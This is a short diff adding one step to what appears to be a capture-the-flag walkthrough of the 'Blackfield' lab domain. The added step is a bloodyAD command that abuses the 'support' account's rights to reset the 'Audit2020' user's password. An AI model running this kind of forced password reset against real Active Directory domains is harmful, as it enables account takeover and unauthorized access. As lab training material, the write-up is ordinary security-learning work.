@@ -55,3 +55,5 @@
 
 7. Since the user support can change Audit2020's password, we will change password and enumerate further with Audit2020's credentials.
 
+`bloodyAD --host 10.129.229.17 -d blackfield.local -u support -p $(cat ../recon/support.pass) set password Audit2020 Password1`
+
